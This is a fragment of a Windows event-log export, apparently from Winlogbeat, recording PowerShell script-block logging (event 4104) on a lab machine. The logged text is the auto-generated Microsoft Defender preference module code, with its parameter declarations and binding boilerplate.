          [object]$__cmdletization_value = ${ExclusionProcess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {
          [object]$__cmdletization_value = ${ExclusionIpAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {
          [object]$__cmdletization_value = ${RealTimeScanDirection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {
          [object]$__cmdletization_value = ${RemediationScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; Par

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc"," [Parameter(ParameterSetName='Remove2')]
    [Alias('cloudextimeout')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${CloudExtendedTimeout},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableNetworkProtection},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableControlledFolderAccess},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionOnlyExclusions},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessAllowedApplications},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessProtectedFolders},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionRules_Ids},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]
    ${AttackSurfaceReductionRules_Actions},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('elcp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableLowCpuPriority},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('efhc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableFileHashComputation},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('efsobp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableFullScanOnBatteryPower},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ppurl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ProxyPacUrl},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('proxsrv')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ProxyServer},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('proxbps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ProxyBypass},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('fupo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ForceUseProxyOnly},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dtlsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableTlsParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dhttpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableHttpParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ddnsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableDnsParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ddnstcpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableDnsOverTcpParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dsshp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableSshParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('puc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${PlatformUpdatesChannel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('euc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EngineUpdatesChannel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('duc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DefinitionUpdatesChannel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dgr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableGradualRelease},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('anpdl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowNetworkProtectionDownLevel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('adpows')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowDatagramProcessingOnWinServer},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ednss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableDnsSinkhole},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dicf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableInboundConnectionFiltering},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drdpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRdpParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dnppt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableNetworkProtectionPerfTelemetry},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tlps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${TrustLabelProtectionStatus},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('astai')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowSwitchToAsyncInspection},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleOffset},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dtdtf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableTDTFeature},

    [Parameter(ParameterSetName='Remove2')]
    [switch]
    ${Force},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Remove2')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Remove2')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {
          [object]$__cmdletization_value = ${ExclusionExtension}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {
          [object]$__cmdletization_value = ${ExclusionProcess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {
          [object]$__cmdletization_value = ${ExclusionIpAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {
          [object]$__cmdletization_value = ${RealTimeScanDirection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {
          [object]$__cmdletization_value = ${RemediationScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; Par",12,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3341,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",a3kSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.207",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (13 of 20):
ameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {
          [object]$__cmdletization_value = ${RemediationScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {
          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {
          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {
          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {
          [object]$__cmdletization_value = ${ServiceHealthReportInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {
          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {
          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {
          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {
          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanParameters')) {
          [object]$__cmdletization_value = ${ScanParameters}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {
          [object]$__cmdletization_value = ${ScanScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {
          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {
          [object]$__cmdletization_value = ${ScanScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType 

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
